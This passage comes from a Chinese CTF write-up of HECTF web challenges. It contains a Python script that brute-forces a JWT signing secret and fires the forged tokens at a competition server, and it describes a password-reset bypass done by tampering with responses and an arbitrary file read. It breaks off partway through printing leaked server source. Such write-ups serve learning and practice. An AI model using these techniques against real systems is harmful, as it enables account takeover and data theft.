什么？？？我们是不是好兄弟，你背着我偷偷打什么比赛？？？</span></span><br><span class="line"><span class="comment">    B: 没有啦，你要打吗，HECTF，来玩吧。</span></span><br><span class="line"><span class="comment">    A: 可以啊！够兄弟的，HECTF是大写还是小写，我去搜搜。</span></span><br><span class="line"><span class="comment">    B: 嘿嘿，这是秘密，你试试就知道啦。</span></span><br><span class="line"><span class="comment">    A: 行吧，你真讨厌。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
<p>​		第一个门就正常按按鼠标就开了，多点很多次而已，第二个门是只有 vip 勇者能进，点击获取令牌，然后抓包发现 Cookie：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role=user; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicGxheWVyIiwiYmxlc3NlZCI6ZmFsc2UsImV4cCI6MTc2NjIyNTY0OH0.H10-DibPmALQ0RyNSp08JlQlL4Rmc7wo8cOd1kau1-U</span><br></pre></td></tr></table></figure>
<p>​		看起来是 Jwt 解密，role 也是 user，姑且把 user 换成 vip（这里是小写，因为大写绕不过）绕过：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/5bb50394aa244e94b547393321dd3775.png#pic_center" alt="在这里插入图片描述"></p>
<blockquote>
<p>VIP 通道畅通！但宝藏仍被封印……</p>
</blockquote>
<p>​		说明得开第三门，Jwt 解密看看：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/1f975b6985d74ee79114d697ef570032.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		根据这个猜测把 blessed 换成 true 即可，那么就是猜测密钥的问题了，根据上面注释：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    A: 什么？？？我们是不是好兄弟，你背着我偷偷打什么比赛？？？</span><br><span class="line">    B: 没有啦，你要打吗，HECTF，来玩吧。</span><br><span class="line">    A: 可以啊！够兄弟的，HECTF是大写还是小写，我去搜搜。</span><br><span class="line">    B: 嘿嘿，这是秘密，你试试就知道啦。</span><br><span class="line">    A: 行吧，你真讨厌。</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>​		先说了 HECTF 是大写还是小写，然后后面又说了 这是秘密，草，坑在这里啊，HECTF 就是密钥，吗？那么密钥的大写和小写就是问题了，	直接爆破，下面这个代码直接运行就能爆破出 flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_hectf_jwt_list</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成HECTF所有大小写组合对应的JWT列表（返回：[(密钥, JWT令牌), ...]）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. 固定JWT Header（与你提供的token格式一致）</span></span><br><span class="line">    jwt_header = &#123;</span><br><span class="line">        <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">        <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 固定JWT Payload（与你提供的token载荷一致，可按需调整blessed/exp字段）</span></span><br><span class="line">    jwt_payload = &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: <span class="string">&quot;player&quot;</span>,</span><br><span class="line">        <span class="string">&quot;blessed&quot;</span>: <span class="literal">True</span>,  <span class="comment"># 可尝试改为False测试不同状态</span></span><br><span class="line">        <span class="string">&quot;exp&quot;</span>: <span class="number">1766225297</span>  <span class="comment"># 若提示令牌过期，可改为当前时间戳+3600（例如int(time.time())+3600）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 生成HECTF所有大小写组合（2^5=32种）</span></span><br><span class="line">    base_chars = <span class="string">&quot;HECTF&quot;</span></span><br><span class="line">    char_options = [[c.upper(), c.lower()] <span class="keyword">for</span> c <span class="keyword">in</span> base_chars]</span><br><span class="line">    hectf_secret_list = [<span class="string">&#x27;&#x27;</span>.join(comb) <span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(*char_options)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 生成每个密钥对应的JWT</span></span><br><span class="line">    jwt_list = []</span><br><span class="line">    <span class="keyword">for</span> secret <span class="keyword">in</span> hectf_secret_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt_token = jwt.encode(</span><br><span class="line">                payload=jwt_payload,</span><br><span class="line">                key=secret,</span><br><span class="line">                algorithm=<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">                headers=jwt_header</span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># 兼容pyjwt不同版本的返回格式（部分版本返回bytes，需转为字符串）</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(jwt_token, <span class="built_in">bytes</span>):</span><br><span class="line">                jwt_token = jwt_token.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            jwt_list.append((secret, jwt_token))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;⚠️  密钥 <span class="subst">&#123;secret&#125;</span> 生成JWT失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jwt_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_jwt_batch</span>(<span class="params">target_url, jwt_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;批量测试JWT有效性，精准识别无效令牌响应，优化输出&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. 固定请求头（复用原始请求头，动态替换Cookie）</span></span><br><span class="line">    base_headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.100.66.83:32714&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.100.66.83:32714/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 固定请求体（可按需修改door或courage参数）</span></span><br><span class="line">    request_body = <span class="string">&quot;door=C&amp;courage=1500&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 无效令牌响应标识（用于过滤冗余输出）</span></span><br><span class="line">    invalid_token_msg = <span class="string">&quot;无效的神圣令牌&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;🚀 开始批量测试，共<span class="subst">&#123;<span class="built_in">len</span>(jwt_list)&#125;</span>个JWT令牌...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;📌 无效令牌响应将自动标记，仅高亮异常/有效结果\n&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 延迟1秒，便于查看提示信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, (secret, jwt_token) <span class="keyword">in</span> <span class="built_in">enumerate</span>(jwt_list, <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 动态构造Cookie</span></span><br><span class="line">        current_headers = base_headers.copy()</span><br><span class="line">        current_headers[<span class="string">&quot;Cookie&quot;</span>] = <span class="string">f&quot;role=VIP; token=<span class="subst">&#123;jwt_token&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送POST请求</span></span><br><span class="line">            response = requests.post(</span><br><span class="line">                url=target_url,</span><br><span class="line">                headers=current_headers,</span><br><span class="line">                data=request_body,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            response_text = response.text.strip()</span><br><span class="line">            status_code = response.status_code</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 分类输出结果</span></span><br><span class="line">            <span class="keyword">if</span> invalid_token_msg <span class="keyword">in</span> response_text <span class="keyword">and</span> status_code == <span class="number">403</span>:</span><br><span class="line">                <span class="comment"># 无效令牌，简化输出</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;idx:2d&#125;</span>个 | 密钥: <span class="subst">&#123;secret&#125;</span> | 状态: 403（无效令牌）&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 非无效令牌响应，详细输出（可能是有效结果或其他异常）</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n===== 第<span class="subst">&#123;idx:2d&#125;</span>个测试（非无效令牌）======&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;密钥: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;JWT: <span class="subst">&#123;jwt_token&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;状态码: <span class="subst">&#123;status_code&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;响应内容: <span class="subst">&#123;response_text&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 检测flag关键词，找到有效结果立即终止</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response_text.lower():</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;🎉 找到有效JWT！密钥：<span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;🎉 完整响应：<span class="subst">&#123;response_text&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> secret, jwt_token</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># 请求异常，详细输出</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n===== 第<span class="subst">&#123;idx:2d&#125;</span>个测试（请求异常）======&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;密钥: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;JWT: <span class="subst">&#123;jwt_token&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ 异常信息：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n🔍 批量测试完成！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;提示：若全部为403无效令牌，可尝试：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  1. 修改JWT Payload中的blessed字段（True/False互换）&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  2. 更新exp时间戳为当前有效时间（避免令牌过期）&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  3. 调整请求体中的door（A/B/C）或courage参数值&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 目标URL</span></span><br><span class="line">    TARGET_URL = <span class="string">&quot;http://47.100.66.83:31648/enter&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 生成JWT列表</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;📌 正在生成HECTF所有大小写组合的JWT...&quot;</span>)</span><br><span class="line">    jwt_test_list = generate_hectf_jwt_list()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;📌 共生成<span class="subst">&#123;<span class="built_in">len</span>(jwt_test_list)&#125;</span>个有效JWT令牌\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 批量测试</span></span><br><span class="line">    valid_secret, valid_jwt = test_jwt_batch(TARGET_URL, jwt_test_list)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 最终结果汇总</span></span><br><span class="line">    <span class="keyword">if</span> valid_secret <span class="keyword">and</span> valid_jwt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n✅ 测试成功！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;有效密钥：<span class="subst">&#123;valid_secret&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;有效JWT：<span class="subst">&#123;valid_jwt&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n❌ 未找到有效JWT，可参考提示调整参数后重试。&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="谁家blog里有这功能"><a class="markdownIt-Anchor" href="#谁家blog里有这功能">#</a> 谁家 blog 里有这功能？</h2>
<blockquote>
<p>Bob 在宿舍里闲的 damn 疼，不知道干什么，他的朋友 Alice 最近整了个个人博客主页，最近几天天 天在他面前炫耀，他觉得心理很不爽，有种被朋友内卷自己却在摆烂而感觉到了背叛的感觉，于是 他费尽心力终于捣鼓出来了一个，但是他搓出来的网站有一些其他博客作者不会有的功能…</p>
<p>注意：由于出题人学艺不精的问题，在做题过程中可能会出现网站无法访问的情况，可能是 exit 把 整个程序停掉了，请等待三十秒，三十秒后应该会重新启动，若三十秒后没有启动的，可以重启环 境。</p>
</blockquote>
<p>​		一般类似的 CMS 的题直接登后台爆破弱口令碰碰运气，不过这个有可能爆不出来，但存在忘记密码的接口，这个是很多漏洞的可以利用的点，所以这里可以赌一把试试看：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/0b7f258b54284828a595288be2af6157.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		这里看 url 似乎有可以利用的点，测测看是否存在这种逻辑漏洞（前端对后端响应进行验证，然后跳转到第二个重置密码的页面，以此类推，直到最后的一个页面，当后端认为前两次验证已经完成了，不需要进行后续验证，之类可能会存在任意密码修改的洞，不过实际情况下应该大部分都修了，我这里只是模拟这个洞的点，不会根实际情况一样），这里抓一下响应包看看：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/5d019db2e5564085ab796870ff274f3c.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		相应包之类可以修改 <code>&quot;success&quot;:false</code>  为 <code>&quot;success&quot;:true</code> ，成功跳转到第二次验证：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/a75aba59a26843f48f48e6468991d450.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		之后随便输，抓包看看：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/a45d5b829423438aa2fc8f4c71c039ed.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		原本的 step1 变成了 step2，可以猜猜看最后的一步可以是 step3 或者 step4，不过这里还是老老实实一步步下去，老样子，抓相应包，改参数：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/4f4729bd09c3481a80760e7c0b7206ad.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		成功跳转到这一步，那就修改密码为 123，之后抓包看看：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/8a4c9d39a2824acb9621a37fdcfb4b65.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		之后抓相应包看看：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/3c81973b813449a99324d2e11838bf54.png#pic_center" alt="在这里插入图片描述"><br>
 1117210622168.png&amp;pos_id=img-A0YJbOft-1767957868072)</p>
<p>​		这里我没改，证明修改密码成功了，之后就可以去登录了，成功进入后台：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/b5873968dbb14c21a10c349dcd5c9d1e.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		往下面翻发现了这里有个超链接，似乎可以点，点击之后发现是下载博客的地方：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/6751e2c1503f470697ba7fbe83c7d605.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		抓包之后发现了文件下载接口，似乎可以任意文件读：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/e5a07ef7ba6546d29923caaef1d693fa.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		试着读取根目录下的 flag 文件失败了，被 forbidden 了，不过可以读取源码，直接下载 app.py 得到源码，源码里有用的地方在这儿：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template, session, redirect, url_for, flash,send_file, abort</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;super_secret_key_for_session_2025&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;password_md5&#x27;</span>: hashlib.md5(<span 